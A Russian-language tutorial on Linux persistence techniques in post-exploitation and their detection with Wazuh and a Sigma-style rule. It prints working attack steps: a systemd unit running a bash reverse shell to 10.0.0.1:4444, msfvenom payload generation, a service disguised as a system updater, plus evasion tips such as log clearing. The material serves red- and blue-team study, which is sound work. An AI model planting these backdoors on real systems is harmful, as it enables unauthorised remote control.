# Закрепление на Linux-хосте: Архитектура, техники и детекция в пост-эксплуатации

## Контекст и базовые понятия

Пост-эксплуатация (Post-Exploitation) — это фаза жизненного цикла атаки, следующая за получением первоначального доступа (Initial Access). На этой фазе злоумышленник уже имеет интерактивную оболочку (shell) на скомпрометированной системе и переходит от разведки к удержанию контроля. Ключевой задачей на данном этапе является **закрепление (Persistence)** — создание механизмов, обеспечивающих сохранение доступа к цели после перезагрузки системы, смены учетных данных, перезапуска служб или других прерываний, которые могут уничтожить временный канал связи (например, обратный вызов reverse shell).

В контексте Linux-инфраструктур закрепление реализуется через манипуляцию системными конфигурациями, планировщиками задач, механизмами аутентификации и динамическим линковщиком. В отличие от Windows, где доминирующим вектором часто является реестр, в Linux архитектура закрепления распределена по множеству файлов конфигурации, служб инициализации и пользовательских профилей. Понимание разницы между легитимными системными механизмами и их вредоносным использованием является фундаментальным для специалистов по защите (Blue Team) и тестировщиков на проникновение (Red Team).

Для корректного анализа необходимо разграничить понятия **Persistence** (закрепление) и **Privilege Escalation** (повышение привилегий). Хотя они часто идут рука об руку, их цели различны: повышение привилегий дает права `root` или `sudo`, тогда как закрепление гарантирует, что эти права (или права обычного пользователя) будут восстановлены после перезагрузки. Также важно отличать **Persistence** от **Lateral Movement** (горизонтального перемещения): закрепление работает локально на хосте, обеспечивая долгосрочный доступ, тогда как перемещение направлено на распространение в сети.

Ниже представлена сравнительная таблица, разграничивающая основные категории механизмов закрепления в Linux по уровню воздействия и области применения.

| Категория механизма | Уровень воздействия | Примеры объектов | Характерная особенность | Типичные индикаторы компрометации (IoC) |
|---|---|---|---|---|
| **Планировщики задач** | Пользовательский / Системный | `cron`, `systemd timers`, `at` | Периодическое выполнение скрипта по расписанию. Легко маскируется под легитимные бэкапы. | Новые записи в `/var/spool/cron/`, новые юниты `.timer` в `/etc/systemd/system/`. |
| **Скрипты инициализации** | Системный (Boot/Logon) | `systemd services`, `rc.local`, `init.d`, `upstart` | Запуск процесса при загрузке ОС или входе пользователя. Требует прав root для системных служб. | Новые файлы `.service` с нестандартными путями, изменения в `/etc/rc.local`. |
| **Манипуляция аутентификацией** | Сетевой / Системный | `~/.ssh/authorized_keys`, PAM модули | Обход парольной аутентификации. Позволяет войти без знания пароля. | Новые публичные ключи в файлах `authorized_keys`, изменения в `/etc/pam.d/`. |
| **Модификация оболочки** | Пользовательский | `.bashrc`, `.profile`, `/etc/profile.d/` | Выполнение кода при открытии новой сессии. Работает только при интерактивном входе. | Изменения в хэш-суммах файлов профилей, добавление странных команд (например, `nc`, `socat`). |
| **Динамический линковщик** | Системный (Runtime) | `LD_PRELOAD`, `/etc/ld.so.conf`, `ld.so.cache` | Внедрение кода в память любого выполняющегося процесса. Высокая сложность детекции. | Изменения в `ld.so.conf`, наличие нестандартных библиотек `.so` в системных директориях. |
| **Внедрение в память** | Процессный (In-Memory) | `ptrace`, `mmap`, `dlopen` | Загрузка шеллкода в память легитимного процесса без записи на диск. Временное закрепление. | Аномальная активность `ptrace`, изменения в `/proc/<pid>/maps`, нестандартные `mmap` вызовы. |

Путаница между этими категориями часто возникает из-за того, что один и тот же инструмент (например, `systemd`) может использоваться как для легитимного управления службами, так и для закрепления. Различие заключается в **интенте** и **контексте**: легитимная служба выполняет бизнес-логику, тогда как вредоносная служба выполняет задачу удержания доступа (C2-канала, бэкдора).

## Внутреннее устройство механизмов закрепления

Закрепление в Linux опирается на архитектуру иерархической загрузки системы, модель разделения прав и механизмы динамической компоновки. Для полного понимания предмета необходимо рассмотреть ключевые компоненты, которые злоумышленники модифицируют или создают.

### 1. Системы инициализации и планировщики

Современные дистрибутивы Linux (Ubuntu, RHEL, Debian) используют `systemd` в качестве инициальной системы (init system). `systemd` управляет загрузкой служб, монтированием файловых систем и управлением процессами. Злоумышленники создают новые юниты (`*.service`), которые запускаются при достижении определенного целевого состояния (target), например, `multi-user.target` (аналог запуска в многопользовательском режиме).

Структура юнита `systemd` позволяет скрыть вредоносный бинарный файл в стандартных директориях или использовать легитимные бинарные файлы с измененными аргументами.

```ini
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash /tmp/.hidden/backdoor.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

Помимо `systemd`, исторически важную роль играли скрипты `rc.local` (System V Init) и планировщик `cron`. `cron` работает на уровне пользователя и системы, запуская задачи по расписанию. Злоумышленники добавляют записи в `/etc/crontab`, `/etc/cron.d/` или пользовательские `crontab`.

### 2. Динамический линковщик (Dynamic Linker)

Механизм `LD_PRELOAD` и конфигурация `/etc/ld.so.conf` позволяют перехватывать вызовы динамических библиотек. Когда исполняемый файл запускается, динамический линковщик (`ld-linux.so`) загружает необходимые библиотеки. Если в переменной окружения `LD_PRELOAD` указана вредоносная библиотека, она загружается **до** всех остальных. Это позволяет перехватывать функции (например, `getuid`, `geteuid`, `connect`), изменяя поведение любой программы, которая их вызывает.

Файл `/etc/ld.so.conf` определяет пути поиска библиотек. Добавление туда нестандартной директории (например, `/tmp/lib`) позволяет линковщику находить поддельные библиотеки.

### 3. Модули подстановочной аутентификации (PAM)

PAM (Pluggable Authentication Modules) — это фреймворк, разделяющий приложения от методов аутентификации. Модули PAM находятся в `/lib/security/` или `/usr/lib/security/`. Злоумышленники могут:
1.  Добавить новый модуль, который всегда возвращает успешную аутентификацию.
2.  Изменить конфигурацию в `/etc/pam.d/` (например, `sshd`, `login`), чтобы игнорировать проверку пароля или логировать введенные данные.

### 3. SSH-аутентификация

Наиболее распространенный и "чистый" метод закрепления. Добавление публичного ключа в `~/.ssh/authorized_keys` позволяет войти по SSH без пароля. Этот метод трудно отличить от легитимного административного доступа без анализа истории изменений файлов.

### Сравнительная таблица механизмов закрепления

| Механизм | Сложность внедрения | Степень скрытности | Требует прав root? | Эффективность после перезагрузки |
|---|---|---|---|---|
| **Systemd Service** | Низкая | Средняя (зависит от имени) | Да | Высокая |
| **Cron Job** | Низкая | Низкая (легко проверить) | Нет (для user-level) | Высокая |
| **LD_PRELOAD** | Высокая | Высокая | Да (для системных путей) | Средняя (зависит от перезапуска процессов) |
| **SSH Key** | Низкая | Высокая | Нет (если есть доступ к файлу) | Высокая |
| **PAM Module** | Очень высокая | Очень высокая | Да | Высокая |
| **In-Memory (ptrace)** | Очень высокая | Очень высокая | Нет (для своих процессов) | Низкая (теряется при краше процесса) |

## Применение и работа с предметом

На практике работа с механизмами закрепления включает три направления: внедрение (Red Team), обнаружение (Blue Team) и аудит. Специалисту необходимо уметь не только применять техники, но и понимать, какие артефакты они оставляют в системе.

### Внедрение и конфигурация

При тестировании на проникновение выбор метода зависит от уровня привилегий и требований к устойчивости.

1.  **Для низких привилегий:** Используются пользовательские `cron` задачи, модификация `.bashrc` или внедрение SSH-ключей, если есть доступ к директории `.ssh`.
2.  **Для высоких привилегий:** Создаются системные службы `systemd`, модифицируется `ld.so.conf`, устанавливаются PAM-модули.

Пример создания службы `systemd` для закрепления:

```bash
# Создание файла службы
cat > /etc/systemd/system/update-helper.service << EOF
[Unit]
Description=System Update Helper
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Активация службы
systemctl daemon-reload
systemctl enable update-helper.service
systemctl start update-helper.service
```

### Обнаружение и аудит

Обнаружение закрепления требует анализа изменений файловых систем, логов инициализации и сетевого трафика.

**Анализ systemd:**
Легитимные службы обычно находятся в `/lib/systemd/system/` или `/usr/lib/systemd/system/`. Службы, созданные администратором, — в `/etc/systemd/system/`. Злоумышленники часто создают службы в `/etc/systemd/system/` с именами, имитирующими системные (например, `systemd-update-helper.service`).

**Анализ cron:**
Проверка системных файлов и пользовательских очередей:
```bash
# Проверка системных каталогов cron
ls -la /etc/cron.d/
cat /etc/crontab

# Проверка пользовательских cron
crontab -l
```

**Анализ LD_PRELOAD:**
Проверка переменных окружения и конфигурационных файлов:
```bash
# Проверка переменной окружения
echo $LD_PRELOAD

# Проверка конфигурации линковщика
cat /etc/ld.so.conf
cat /etc/ld.so.cache
```

### Типичные ошибки и подводные камни

1.  **Слишком очевидные имена:** Создание службы `backdoor.service` или `hack.service` сразу привлекает внимание. Злоумышленники используют имена вроде `systemd-resolved-helper` или `network-manager-updater`.
2.  **Отсутствие маскировки трафика:** Обратные вызовы (reverse shells) часто используют стандартные порты (80, 443), но могут быть заблокированы фаерволом. Использование `gsocket` или туннелирование через DNS/HTTP помогает обойти ограничения.
3.  **Игнорирование логов:** Многие механизмы (например, `cron`) логируют свои действия в `/var/log/syslog` или `/var/log/cron`. Неочистка логов после внедрения оставляет следы.
4.  **Нестабильность in-memory:** Механизмы внедрения в память (например, через `ptrace`) теряются при перезагрузке или краше процесса. Они подходят для краткосрочного доступа, но не для долгосрочного закрепления.

## Сквозной практический пример: Закрепление через systemd и обнаружение через Wazuh

**Исходные условия:**
*   **Среда:** Ubuntu 22.04 LTS (целевой хост), Kali Linux (атакующий).
*   **Роль:** Тестировщик на проникновение (Red Teamer).
*   **Цель:** Обеспечить доступ к системе после перезагрузки без использования пароля.
*   **Инструменты:** `msfvenom` (генерация шеллкода), `systemctl` (управление службами), `Wazuh Agent` (установлен на целевом хосте для детекции).

**Шаг 1: Генерация и размещение полезной нагрузки**

Атакующий генерирует бинарный файл обратного вызова (reverse shell) и сохраняет его в скрытой директории, чтобы избежать случайного обнаружения при базовом просмотре файлов.

```bash
# Генерация шеллкода (Linux x64, обратный вызов на IP 10.0.0.1, порт 4444)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o /tmp/.system-update-helper

# Создание скрытой директории и перемещение файла
mkdir -p /tmp/.systemd-helper
mv /tmp/.system-update-helper /tmp/.systemd-helper/update-helper
chmod +x /tmp/.systemd-helper/update-helper
```

**Шаг 2: Создание и активация службы systemd**

Атакующий создает юнит-файл, имитирующий легитимную системную службу обновления, и регистрирует его в системе.

```bash
# Создание файла службы
cat > /etc/systemd/system/systemd-update-helper.service << EOF
[Unit]
Description=System Update Helper Service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.systemd-helper/update-helper
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

# Перезагрузка конфигурации systemd и активация службы
systemctl daemon-reload
systemctl enable systemd-update-helper.service
systemctl start systemd-update-helper.service

# Проверка статуса службы
systemctl status systemd-update-helper.service
```

*Ожидаемый вывод:* Служба переходит в состояние `active (running)`. Атакующий получает обратный вызов на свой C2-сервер.

**Шаг 3: Обнаружение через Wazuh (Blue Team perspective)**

Wazuh, установленный на целевом хосте, собирает логи и события. Атакующий создал новый файл в `/etc/systemd/system/` и запустил подозрительный процесс.

**Артефакт: Логи Wazuh (JSON-формат, фрагмент алерта)**

```json
{
  "rule": {
    "id": "550",
    "level": 7,
    "description": "New systemd service created",
    "groups": ["syslog", "systemd", "configuration_changes"]
  },
  "agent": {
    "id": "001",
    "name": "ubuntu-target"
  },
  "data": {
    "command": "systemctl enable systemd-update-helper.service",
    "output": "Created symlink /etc/systemd/system/multi-user.target.wants/systemd-update-helper.service -> /etc/systemd/system/systemd-update-helper.service."
  },
  "decoder": {
    "name": "syslog"
  },
  "location": "/var/log/syslog"
}
```

**Артефакт: Правило детекции (Sigma-подобная структура для Elastic/Splunk)**

```yaml
title: Suspicious Systemd Service Creation
id: 12345678-1234-1234-1234-123456789012
status: experimental
level: high
description: Detects creation of new systemd services in /etc/systemd/system/
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    EventID: 1
    CommandLine|contains:
      - 'systemctl enable'
      - 'systemctl start'
    Image|endswith: 'systemctl'
  filter_legit:
    Image|endswith: 'systemctl'
    CommandLine|contains:
      - '/lib/systemd/system/'
      - '/usr/lib/systemd/system/'
  condition: selection and not filter_legit
falsepositives:
  - Admin activity
  - Automated deployment tools (Ansible, Puppet)
```

**Ожидаемый вывод:**
Алерт Wazuh срабатывает при создании новой службы `systemd-update-helper.service`. Аналитик видит, что служба указывает на исполняемый файл в `/tmp/`, что является аномалией (легитимные службы обычно находятся в `/usr/bin/` или `/usr/sbin/`). Процесс `update-helper` пытается установить соединение с внешним IP `10.0.0.1` на порт 4444, что подтверждает наличие C2-канала.

**Вывод по примеру:**
Пример демонстрирует классический вектор закрепления через `systemd`. Несмотря на маскировку под системную службу, аномальное расположение бинарного файла (`/tmp/`) и нестандартный порт обратного вызова позволяют детектировать инцидент. Использование Wazuh и правил детекции на изменение конфигурации `systemd` эффективно выявляет такие попытки.

## Аналитический вывод

Закрепление на Linux-хосте представляет собой многогранный процесс, использующий легитимные механизмы операционной системы для обеспечения долгосрочного доступа. Ключевые векторы включают манипуляцию планировщиками задач (`cron`, `systemd timers`), скриптами инициализации (`systemd services`, `rc.local`), механизмами аутентификации (SSH keys, PAM) и динамическим линковщиком (`LD_PRELOAD`). Выбор конкретного метода зависит от уровня привилегий злоумышленника и требований к устойчивости доступа.

Для специалистов по защите критически важно понимать, что закрепление часто маскируется под административную деятельность. Легитимные службы `systemd` и записи `cron` являются нормой, поэтому детекция требует анализа аномалий: нестандартных путей размещения бинарных файлов, необычных имен служб, изменений в конфигурации линковщика и аномального сетевого трафика. Инструменты вроде Wazuh, OSQuery и SIEM-системы, настроенные на мониторинг изменений файловых систем и логов инициализации, являются основным средством противодействия.

В условиях современных атак закрепление часто комбинируется с другими техниками пост-эксплуатации, такими как повышение привилегий и горизонтальное перемещение. Поэтому защита должна быть комплексной: регулярный аудит конфигураций, хеширование системных файлов (Integrity Monitoring) и мониторинг поведения процессов (EDR) позволяют выявить не только факт закрепления, но и его природу.

## Источники

1.  [Advanced Linux Persistence: Strategies for Remaining Inside a Linux Target](https://hackers-arise.com/advanced-linux-persistence-strategies-for-remaining-inside-a-linux-target/)
2.  [Post-Exploitation Tactics: A Walkthrough of the Linux Threat Detection 3 Room](https://medium.com/@furkanctiner/post-exploitation-tactics-a-walkthrough-of-the-linux-threat-detection-3-room-%EF%B8%8F-%EF%B8%8F-45038206304f)
3.  [Detecting common Linux persistence techniques with Wazuh](https://wazuh.com/blog/detecting-common-linux-persistence-techniques-with-wazuh/)
4.  [Linux Detection Engineering - Approaching the Summit on Persistence Mechanisms](https://www.elastic.co/security-labs/approaching-the-summit-on-persistence)
5.  [Linux Detection Engineering - A Continuation on Persistence Mechanisms](https://www.elastic.co/security-labs/continuation-on-persistence-mechanisms)
6.  [Inside Post-Exploitation: Techniques and Tactics](https://www.examcollection.com/blog/inside-post-exploitation-techniques-and-tactics/)
7.  [Overview of Linux Persistence Techniques and Detection Tools Explained](https://linuxsecurity.com/features/linux-persistence-mechanisms-detection-tools)
8.  [Post-Exploitation Persistence Techniques](https://securiumsolutions.com/post-exploitation-persistence-techniques/)
9.  [The art of Linux persistence](https://hadess.io/wp-content/uploads/2023/12/Art-of-Linux-Persistence.pdf)
10. [Linux Persistence Mechanisms and How to Find Them](https://securityboulevard.com/2024/10/linux-persistence-mechanisms-and-how-to-find-them/)
11. [Linux Persistence Techniques: How Attackers Maintain Long-Term Access](https://www.datayard.us/knowledge_articles/linux-persistance-techniques/)
12. [Linux Detection Engineering - A Sequel on Persistence Mechanisms](https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms)